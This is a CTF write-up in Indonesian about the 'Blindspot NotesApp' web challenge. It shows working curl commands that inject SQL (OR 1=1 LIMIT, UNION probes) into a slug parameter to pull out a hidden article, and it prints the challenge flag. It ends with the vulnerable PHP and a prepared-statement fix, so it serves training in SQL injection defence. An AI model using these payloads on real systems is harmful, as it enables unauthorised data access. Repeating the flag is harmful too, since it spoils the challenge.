---
title: "Write-up-Blindspot NotesApp"
description: "Migrated from database"
year: 2026
category: "CTF"
techStack: "CTF, WebExploit, CLI"
githubUrl: "-"
demoUrl: "-"
coverUrl: "/uploads/cover_1768872648422_3758fc9da0c9e.png"
createdAt: "2026-01-20T01:30:48.469Z"
updatedAt: "2026-01-24T17:48:01.307Z"
---

# Write-up-Blindspot NotesApp

# Write-up CTF: Blindspot NotesApp


## Informasi Challenge

**Nama:** Blindspot NotesApp  
**Kategori:** Web  
**Tingkat Kesulitan:** Easy  
**Poin:** 210  
**Author:** aria

**Deskripsi:**
> Aplikasi ini terlihat lengkap dan berfungsi dengan baik. Semua fitur utama bekerja seperti seharusnya. Meski begitu, tidak ada aplikasi yang benar-benar sempurna. Coba jelajahi semuanya.

**URL:** https://note.aria.my.id

---

## Tahap 1: Reconnaissance (Pengintaian Awal)

### Eksplorasi Website

Aplikasi ini adalah platform note-taking bernama "NotesApp" dengan halaman-halaman berikut:
- `index.php` - Halaman utama
- `articles.php` - Daftar artikel (menampilkan 2 artikel publik)
- `article.php?slug=X` - Halaman artikel individual
- `login.php` - Halaman login
- `signup.php` - Halaman registrasi
- `dashboard.php` - Dashboard user (butuh login)

### Artikel yang Terlihat

Di halaman publik, hanya 2 artikel yang terlihat:
1. "Getting Started with NotesApp" (`slug=getting-started-with-notesapp`)
2. "Security Best Practices for Your Notes" (`slug=security-best-practices`)

Keduanya menampilkan **0 views** (👁️ 0 views), yang tetap 0 meskipun sudah diakses berkali-kali.

---

## Tahap 2: Testing Autentikasi

### Membuat Akun

Pertama, saya mendaftar akun untuk mengeksplorasi fitur yang memerlukan login:

```bash
curl -X POST 'https://note.aria.my.id/signup.php' \
  -d 'full_name=Hacker Test' \
  -d 'username=hacker999' \
  -d 'email=hacker999@test.com' \
  -d 'password=Pass123456' \
  -d 'confirm_password=Pass123456' \
  -c cookies.txt
```

### Login

```bash
curl -X POST 'https://note.aria.my.id/login.php' \
  -d 'username=hacker999' \
  -d 'password=Pass123456' \
  -b cookies.txt \
  -c cookies.txt \
  -L
```

### Fitur Setelah Login

Setelah login, saya mendapat akses ke:
- **Dashboard** - Bisa membuat catatan pribadi
- **Manajemen Note** - Buat, lihat, dan hapus catatan

Namun, daftar artikel tetap hanya menampilkan 2 artikel publik yang sama, bahkan setelah login.

---

## Tahap 3: Mencari Vulnerability

### Testing SQL Injection

Nama challenge "**Blindspot**" mengindikasikan ada sesuatu yang tersembunyi atau tidak terlihat. Saya mencoba menguji endpoint `article.php` untuk vulnerability SQL injection.

#### Penemuan Awal

```bash
# Test dengan kondisi OR
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=security-best-practices%27%20OR%20slug%20LIKE%20%27%25flag%25" -s | grep -o "<title>.*</title>"
```

**Hasil:** `<title>Security Best Practices for Your Notes - NotesApp</title>`

Ini mengkonfirmasi adanya **SQL injection vulnerability**! Query mengembalikan artikel meskipun slug tidak cocok, membuktikan SQL injection berhasil.

---

## Tahap 4: Eksploitasi

### Menentukan Jumlah Kolom

Pertama, saya mencoba mencari tahu jumlah kolom dalam query SQL:

```bash
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20UNION%20SELECT%20NULL--%20-" -s
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20UNION%20SELECT%20NULL,NULL--%20-" -s
# ... hingga 6 kolom
```

Semua mengembalikan "Article Not Found", menandakan serangan UNION tidak langsung mengembalikan hasil dalam format yang diharapkan.

### Enumerasi Semua Artikel

Menggunakan `OR 1=1` dengan `LIMIT` untuk mengenumerasi semua artikel di database:

```bash
# Artikel pertama (offset 0)
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20OR%201=1%20LIMIT%201--%20-" -s | grep -o "<title>.*</title>"
```
**Output:** `<title>Getting Started with NotesApp - NotesApp</title>`

```bash
# Artikel kedua (offset 1)  
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20OR%201=1%20LIMIT%201,1--%20-" -s | grep -o "<title>.*</title>"
```
**Output:** `<title>Security Best Practices for Your Notes - NotesApp</title>`

```bash
# Artikel ketiga (offset 2) - ARTIKEL TERSEMBUNYI!
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20OR%201=1%20LIMIT%202,1--%20-" -s | grep -o "<title>.*</title>"
```
**Output:** `<title>🚩 INTERNAL - System Architecture - NotesApp</title>`

```bash
# Artikel keempat (offset 3)
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20OR%201=1%20LIMIT%203,1--%20-" -s | grep -o "<title>.*</title>"
```
**Output:** `<title>Article Not Found - NotesApp</title>`

### 🎯 Penemuan Artikel Tersembunyi

Artikel ketiga "**🚩 INTERNAL - System Architecture**" ditemukan! Artikel ini:
- TIDAK muncul di daftar `articles.php` publik
- Hanya bisa ditemukan melalui SQL injection
- Berisi flag yang dicari

---

## Tahap 5: Mengambil Flag

### Mengakses Artikel Tersembunyi

```bash
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20OR%201=1%20LIMIT%202,1--%20-" -s > hidden_article.html
```

### Ekstraksi Flag

```bash
cat hidden_article.html | grep -E "FGTE|flag|FLAG" -i
```

**Flag Ditemukan:**

```html
<h2>🎯 CTF Flag</h2>
<div style="background: #000; color: #0f0; padding: 40px; font-family: monospace; text-align: center;">
<div style="font-size: 24px; font-weight: bold;">
FGTE{4rt1cl3s_4r3_n0t_4lw4ys_s4f3_fr0m_SQLi}
</div>
</div>
```

---

## Analisis Vulnerability

### Apa itu "Blindspot"?

Aplikasi memiliki **"blindspot"** (titik buta) berupa:

1. **Vulnerability SQL Injection** di parameter `article.php?slug=`
2. **Artikel Tersembunyi** yang ada di database tapi tidak ditampilkan di listing artikel publik
3. **Tidak Ada Access Control** - Artikel tersembunyi bisa diakses siapa saja yang menemukan SQL injection

### Mengapa Disebut "Blindspot"?

- Artikel tersembunyi **tidak terlihat** dalam navigasi normal
- Tidak ada link ke artikel ini dari halaman publik mana pun
- Hanya bisa ditemukan melalui enumerasi database via SQL injection
- Nama challenge sempurna menggambarkan vulnerability yang "buta" atau tersembunyi ini

### Kode Vulnerable (Hipotesis)

Kode yang vulnerable kemungkinan seperti ini:

```php
<?php
$slug = $_GET['slug'];
$query = "SELECT * FROM articles WHERE slug = '$slug'";
// Tidak ada sanitasi input atau prepared statements!
$result = mysqli_query($conn, $query);
?>
```

### Implementasi yang Aman

Seharusnya menggunakan prepared statements:

```php
<?php
$slug = $_GET['slug'];
$stmt = $conn->prepare("SELECT * FROM articles WHERE slug = ? AND visible = 1");
$stmt->bind_param("s", $slug);
$stmt->execute();
?>
```

---

## Poin-Poin Penting

1. **SQL Injection** masih merupakan vulnerability kritis bahkan di aplikasi modern
2. **Data tersembunyi** di database bisa terekspos melalui enumerasi SQLi
3. **Penamaan challenge** sering memberikan hint (Blindspot = konten tersembunyi/tidak terlihat)
4. **Validasi input yang proper** dan **prepared statements** sangat penting
5. **Access control** harus diimplementasikan di level query database, bukan hanya di UI

---

## Timeline Solusi

1. **Reconnaissance awal** → Menemukan daftar artikel publik
2. **Membuat akun** → Mengeksplorasi fitur yang memerlukan autentikasi
3. **Testing SQL injection** → Menemukan vulnerability di parameter `slug`
4. **Enumerasi artikel** → Menemukan total 3 artikel (1 tersembunyi)
5. **Mengambil artikel tersembunyi** → Mendapatkan flag

---

## Command Lengkap untuk Solve Challenge

```bash
# 1. Buat akun
curl -X POST 'https://note.aria.my.id/signup.php' \
  -d 'full_name=Test User' \
  -d 'username=testuser999' \
  -d 'email=test999@test.com' \
  -d 'password=Pass123456' \
  -d 'confirm_password=Pass123456' \
  -c cookies.txt

# 2. Login
curl -X POST 'https://note.aria.my.id/login.php' \
  -d 'username=testuser999' \
  -d 'password=Pass123456' \
  -b cookies.txt \
  -c cookies.txt \
  -L

# 3. Enumerasi artikel dengan SQL injection
curl -b cookies.txt "https://note.aria.my.id/article.php?slug=x%27%20OR%201=1%20LIMIT%202,1--%20-" -s | grep -i "FGTE"

# 4. Dapatkan flag
# Output: FGTE{4rt1cl3s_4r3_n0t_4lw4ys_s4f3_fr0m_SQLi}
```

---

## Flag

```
FGTE{4rt1cl3s_4r3_n0t_4lw4ys_s4f3_fr0m_SQLi}
```

---

**Selesai! 🎉**

Challenge ini mengajarkan pentingnya:
- Selalu validasi dan sanitasi input user
- Menggunakan prepared statements untuk query database
- Implementasi proper access control
- Tidak mengandalkan "security through obscurity" (keamanan melalui penyembunyian)
